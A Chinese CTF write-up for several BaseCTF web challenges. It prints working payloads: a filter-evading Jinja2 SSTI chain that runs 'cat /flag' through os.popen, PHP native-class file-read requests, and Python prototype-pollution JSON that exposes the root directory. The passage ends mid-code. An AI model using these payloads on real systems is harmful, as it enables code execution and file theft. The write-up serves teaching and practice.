<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> hashlib <span class="token keyword">import</span> md5

enc <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"3295c76acbf4caaed33c36b1b5fc2cb1"</span><span class="token punctuation">,</span> <span class="token string">"26657d5ff9020d2abefe558796b99584"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span>
       <span class="token string">"ec8956637a99787bd197eacd77acce5e"</span><span class="token punctuation">,</span> <span class="token string">"e2c420d928d4bf8ce0ff2ec19b371514"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">,</span>
       <span class="token string">"ea5d2f1c4608232e07d3aa3d998e5135"</span><span class="token punctuation">,</span> <span class="token string">"c8ffe9a587b126f152ed3d89a146b445"</span><span class="token punctuation">,</span> <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span>
       <span class="token string">"a97da629b098b75c294dffdc3e463904"</span><span class="token punctuation">,</span> <span class="token string">"66f041e16a60928b05a7e228a89c3799"</span><span class="token punctuation">,</span> <span class="token string">"2838023a778dfaecdc212708f721b788"</span><span class="token punctuation">,</span>
       <span class="token string">"65b9eea6e1cc6bb9f0cd2a47751a186f"</span><span class="token punctuation">,</span> <span class="token string">"9a1158154dfa42caddbd0694a4e9bdc8"</span><span class="token punctuation">,</span> <span class="token string">"698d51a19d8a121ce581499d7b701668"</span><span class="token punctuation">,</span>
       <span class="token string">"f0935e4cd5920aa6c7c996a5ee53a70f"</span><span class="token punctuation">,</span> <span class="token string">"7f39f8317fbdb1988ef4c628eba02591"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>
       <span class="token string">"07e1cd7dca89a1678042477183b7ac3f"</span><span class="token punctuation">,</span> <span class="token string">"73278a4a86960eeb576a8fd4c9ec6997"</span><span class="token punctuation">,</span> <span class="token string">"182be0c5cdcd5072bb1864cdee4d3d6e"</span><span class="token punctuation">,</span>
       <span class="token string">"9f61408e3afb633e50cdf1b20de6f466"</span><span class="token punctuation">,</span> <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"a5771bce93e200c36f7cd9dfd0e5deaa"</span><span class="token punctuation">,</span>
       <span class="token string">"f7177163c833dff4b38fc8d2872f1ec6"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"b53b3a3d6ab90ce0268229151c9bde11"</span><span class="token punctuation">,</span>
       <span class="token string">"e369853df766fa44e1ed0ff613f563bd"</span><span class="token punctuation">,</span> <span class="token string">"67c6a1e7ce56d3d6fa748ab6d9af3fd7"</span><span class="token punctuation">,</span> <span class="token string">"4c56ff4ce4aaf9573aa5dff913df997a"</span><span class="token punctuation">,</span>
       <span class="token string">"da4fb5c6e93e74d3df8527599fa62642"</span><span class="token punctuation">,</span> <span class="token string">"c0c7c76d30bd3dcaefc96f40275bdc0a"</span><span class="token punctuation">,</span> <span class="token string">"a3f390d88e4c41f2747bfa2f1b5f87db"</span><span class="token punctuation">,</span>
       <span class="token string">"c74d97b01eae257e44aa9d5bade97baf"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span> <span class="token string">"70efdf2ec9b086079795c442636b55fb"</span><span class="token punctuation">,</span>
       <span class="token string">"6ea9ab1baa0efb9e19094440c317e21b"</span><span class="token punctuation">,</span> <span class="token string">"7cbbc409ec990f19c78c75bd1e06f215"</span><span class="token punctuation">,</span> <span class="token string">"98f13708210194c475687be6106a3b84"</span><span class="token punctuation">,</span>
       <span class="token string">"3c59dc048e8850243be8079a5c74d079"</span><span class="token punctuation">,</span> <span class="token string">"4e732ced3463d06de0ca9a15b6153677"</span><span class="token punctuation">,</span> <span class="token string">"02e74f10e0327ad868d138f2b4fdd6f0"</span><span class="token punctuation">,</span>
       <span class="token string">"35f4a8d465e6e1edc05f3d8ab658c551"</span><span class="token punctuation">,</span> <span class="token string">"28dd2c7955ce926456240b2ff0100bde"</span><span class="token punctuation">,</span> <span class="token string">"43ec517d68b6edd3015b3edc9a11367b"</span><span class="token punctuation">]</span>
flag <span class="token operator">=</span> <span class="token string">''</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> c <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> md5<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>c <span class="token operator">^</span> i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> enc<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">:</span>
            flag <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>
</code></pre>

<h4 id="复读机-SSTI"><a href="#复读机-SSTI" class="headerlink" title="复读机(SSTI)"></a>复读机(SSTI)</h4><p>过滤了很多东⻄，⽽且要求传⼊的字符串必须以 BaseCTF{ 开头，还会检测括号匹配。这⾥使⽤⼯具 Fenjing，本地先搭⼀个可以被 SSTI 的服务器，然后⼿动把过滤的字符串都试出来，再⽤Fenjing 跑。</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> random
<span class="token keyword">from</span> jinja2 <span class="token keyword">import</span> Template
<span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> render_template_string

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
blacklist <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;&#123;'</span><span class="token punctuation">,</span> <span class="token string">'&#125;&#125;'</span><span class="token punctuation">,</span> <span class="token string">'__'</span><span class="token punctuation">,</span> <span class="token string">'.'</span><span class="token punctuation">,</span> <span class="token string">'*'</span><span class="token punctuation">,</span> <span class="token string">'+'</span><span class="token punctuation">,</span> <span class="token string">'-'</span><span class="token punctuation">,</span> <span class="token string">'/'</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">'\\'</span><span class="token punctuation">,</span>
             <span class="token string">'class'</span><span class="token punctuation">,</span> <span class="token string">'base'</span><span class="token punctuation">,</span> <span class="token string">'mro'</span><span class="token punctuation">,</span> <span class="token string">'init'</span><span class="token punctuation">,</span> <span class="token string">'global'</span><span class="token punctuation">,</span> <span class="token string">'builtin'</span><span class="token punctuation">,</span> <span class="token string">'config'</span><span class="token punctuation">,</span> <span class="token string">'request'</span><span class="token punctuation">,</span>
             <span class="token string">'lipsum'</span><span class="token punctuation">,</span> <span class="token string">'cycler'</span><span class="token punctuation">,</span> <span class="token string">'url_for'</span><span class="token punctuation">,</span> <span class="token string">'os'</span><span class="token punctuation">,</span> <span class="token string">'pop'</span><span class="token punctuation">,</span> <span class="token string">'format'</span><span class="token punctuation">,</span> <span class="token string">'replace'</span><span class="token punctuation">,</span> <span class="token string">'reverse'</span>
             <span class="token punctuation">]</span>


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    name <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">,</span> <span class="token string">"guest"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>i <span class="token keyword">in</span> name <span class="token keyword">for</span> i <span class="token keyword">in</span> blacklist<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"error"</span>
    t <span class="token operator">=</span> Template<span class="token punctuation">(</span><span class="token string">"Hello "</span> <span class="token operator">+</span> name<span class="token punctuation">)</span>
    <span class="token keyword">return</span> t<span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">5000</span><span class="token punctuation">)</span>
</code></pre>

<p>Payload</p>
<pre class="language-http" data-language="http"><code class="language-http">fenjing:
python -m fenjing crack --url http://IP:5000/ --method GET --inputs name
POST:
flag=BaseCTF&#123;%set in='_'~'_'~'i''nit'~'_'~'_'%&#125;&#123;%set gl='_'~'_'~'g''lobals'~'_'~'_'%&#125;&#123;%set bu='_'~'_'~'b''uiltins'~'_'~'_'%&#125;&#123;%set im='_'~'_'~'import'~'_'~'_'%&#125;&#123;%set da='OS'|lower%&#125;&#123;%set ca='%c%c%c%c%c%c%c%c%c'%(99,97,116,32,47,102,108,97,103)%&#125;&#123;%print joiner[in][gl][bu][im](da)['p''open'](ca)['read']()%&#125;</code></pre>

<h4 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token operator">?</span>Jail<span class="token punctuation">[</span>by<span class="token operator">.</span>Happy<span class="token operator">=</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token function">glob</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/f*"</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<h4 id="flag直接读取不就行了？-php原生类"><a href="#flag直接读取不就行了？-php原生类" class="headerlink" title="flag直接读取不就行了？(php原生类)"></a>flag直接读取不就行了？(php原生类)</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment"># 我把flag藏在一个secret文件夹里面了，所以要学会遍历啊~</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$J1ng</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'J'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$Hong</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'H'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$Keng</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'K'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$Wang</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'W'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$dir</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$Keng</span><span class="token punctuation">(</span><span class="token variable">$Wang</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$dir</span> <span class="token keyword">as</span> <span class="token variable">$f</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;br>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token keyword">new</span> <span class="token variable">$J1ng</span><span class="token punctuation">(</span><span class="token variable">$Hong</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span></code></pre>

<p>Payload</p>
<pre class="language-http" data-language="http"><code class="language-http">?K=DirectoryIterator&amp;W=/secret/
?K=SplFileObject&amp;W=/secret/f11444g.php</code></pre>

<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/238482#h3-22">PHP 原生类在 CTF 中的利用</a></p>
<h4 id="Back-to-the-future-git泄露"><a href="#Back-to-the-future-git泄露" class="headerlink" title="Back to the future(git泄露)"></a>Back to the future(git泄露)</h4><p>推荐使用<a target="_blank" rel="noopener" href="https://github.com/WangYihang/GitHacker">GitHacker</a></p>
<p>利用工具把这个项目拉下来</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">githacker <span class="token parameter variable">--url</span> http://challenge.basectf.fun:49240/ <span class="token parameter variable">--output</span> back-future</code></pre>

<p>使用<code>git log</code>查看提交记录</p>
<p><img src="git.png" loading="lazy"></p>
<p>可以看到 <code>9d85f10e0192ef630e10d7f876a117db41c30417</code> 这个提交, 我们可以切到那一次提交</p>
<p><strong>切换到特定提交：</strong></p>
<p>你可以使用提交的哈希值 <strong><commit-hash></commit-hash></strong> 来切换到特定的提交状态。这将使你进入”分离头指针”状态，只能查看历史记录，而不能进行分支操作。通常情况下，不建议在分离头指针状态下工作，因为更改可能会丢失。</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> checkout 9d85f10e0192ef630e10d7f876a117db41c30417</code></pre>

<p>或者</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reflog</code></pre>

<p><img src="git_2.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> reset <span class="token parameter variable">--hard</span> 9d85f10</code></pre>

<h4 id="圣钥之战1-0-python-原型链污染"><a href="#圣钥之战1-0-python-原型链污染" class="headerlink" title="圣钥之战1.0(python 原型链污染)"></a>圣钥之战1.0(python 原型链污染)</h4><p>&#x2F;read</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span>request
<span class="token keyword">import</span> json

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v
        <span class="token keyword">elif</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
            merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token builtin">setattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> k<span class="token punctuation">,</span> v<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">is_json</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">try</span><span class="token punctuation">:</span>
        json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>data<span class="token punctuation">)</span>
        <span class="token keyword">return</span> <span class="token boolean">True</span>
    <span class="token keyword">except</span> ValueError<span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token boolean">False</span>

<span class="token keyword">class</span> <span class="token class-name">cls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">pass</span>

instance <span class="token operator">=</span> cls<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'/static/index.html'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/read'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Read</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span>__file__<span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> f"J1ngHong说：你想read flag吗？
那么圣钥之光必将阻止你！
但是小小的源码没事，因为你也读不到flag<span class="token punctuation">(</span>乐<span class="token punctuation">)</span>

<span class="token punctuation">&#123;</span><span class="token builtin">file</span><span class="token punctuation">&#125;</span>

"

<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">'/pollute'</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'GET'</span><span class="token punctuation">,</span> <span class="token string">'POST'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">Pollution</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> request<span class="token punctuation">.</span>is_json<span class="token punctuation">:</span>
        merge<span class="token punctuation">(</span>json<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>request<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">,</span>instance<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">"J1ngHong说：钥匙圣洁无暇，无人可以污染！"</span>
    <span class="token keyword">return</span> <span class="token string">"J1ngHong说：圣钥暗淡了一点，你居然污染成功了？"</span>

<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre>

<p>看到index.html源码有张图片</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">DOCTYPE</span> <span class="token name">html</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span> <span class="token attr-name">lang</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>zh-CN<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>J1ngHong's Message<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">></span></span>J1ngHong说：这是圣钥，纯净无暇，不能污染，但是你可以去read那里找一下flag~<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/static/1.jpeg<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>1.jpeg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>

<p>此时<code>http://domain/static/xxx</code>只能访问到文件系统当前目录下<code>static</code>目录中的<code>xxx</code>文件，并且不存在如目录穿越的漏洞</p>
<p>污染该属性为当根目录。这样就能访问到根目录下的<code>flag</code>文件了</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">GET</span> <span class="token request-target url">/pollute</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">challenge.basectf.fun:27598</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">DNT</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/json</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">59</span></span>
<span class="token application-json">
<span class="token punctuation">&#123;</span><span class="token property">"__init__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"app"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span><span class="token property">"_static_folder"</span><span class="token operator">:</span><span class="token string">"/"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span></code></pre>

<p>官方wp</p>
<p>直接进&#x2F;read看源码，然后进&#x2F;flag进行post方法传参一个json的payload：</p>
<pre class="language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"__init__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__globals__"</span> <span class="token operator">:</span> <span class="token punctuation">&#123;</span><span class="token property">"__file__"</span><span class="token operator">:</span><span class="token string">"/flag"</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre>

<p>然后去&#x2F;read就有flag了。</p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Article-kelp/p/17068716.html">Python原型链污染变体</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/14620?u_atoken=65ddecfdc7f9515861cf73192c653805&u_asession=01tg4Re7x0Sqx3A9faMOrup1F3mTWuKaW_b83fFDALPOQjbSlByuTWDvmso5UJrutRJB-YY_UqRErInTL5mMzm-GyPlBJUEqctiaTooWaXr7I&u_asig=05KUap-1IvBgPL8vv3yGCEzc48Q3oSFVi6MzLmEIrnKCHNj-TcUYd0qEjBQBggpCmBY4-dXw-Dff-QxyIWhBRxKivSQQy06u45IR3F7Ej5igWbWdYp_mc4TBTzDPCYHzJJHdqLK01P4bnw7O9Ygq_e03flitwL3Wj5Od6rPKqtngzBzhvSc0Kr8URjOX9Xe4tkTrTE5w3F08xyE75_wBFoikKIg66WHK8pgCdoRnyOQXTt782cQmBlQQJQ9IDcYv2cGsWAe-e_PYvPamjVaebg-CAqscTuE4GHrj-VNCf8HPd6gx6UxFgdF3ARCQ86jS_u_XR5hatHQVh06VuUZ-D1wA&u_aref=8PtQL6DjIKQRdT5m/qOLtcLvayM=">从CISCN2024的sanic引发对python“原型链”的污染挖掘</a></p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIeAK37KG=22BDRgibD#toc-6">浅谈Python原型链污染及利用方式</a></p>
<h4 id="Jinja-Mark-原型链污染-ssti"><a href="#Jinja-Mark-原型链污染-ssti" class="headerlink" title="Jinja Mark(原型链污染+ssti)"></a>Jinja Mark(原型链污染+ssti)</h4><p>访问index目录 是一个过滤了花括号的ssti注入 不过测试49 得到hint magic目录 要求传入json</p>
<p>访问flag目录 得到hint</p>
<pre class="language-php" data-language="php"><code class="language-php">你不会以为这里真的有flag吧？

想要flag的话先猜猜我的幸运数字

用<span class="token constant">POST</span>方式把 lucky_number 告诉我吧，只有四位数哦</code></pre>

<p>猜出幸运数字返回了 magic的源码 python原型链污染</p>
<pre class="language-python" data-language="python"><code class="language-python">BLACKLIST_IN_index <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'&#123;'</span><span class="token punctuation">,</span><span class="token string">'&#125;'</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">merge</span><span class="token punctuation">(</span>src<span class="token punctuation">,</span> dst<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">for</span> k<span class="token punctuation">,</span> v <span class="token keyword">in</span> src<span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">hasattr</span><span class="token punctuation">(</span>dst<span class="token punctuation">,</span> <span class="token string">'__getitem__'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token builtin">type</span><span class="token punctuation">(</span>v<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">dict</span><span class="token punctuation">:</span>
                merge<span class="token punctuation">(</span>v<span class="token punctuation">,</span> dst<span class="token punctuation">.</span>get<span class="token punctuation">(</span>k<span class="token punctuation">)</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                dst<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">=</span> v
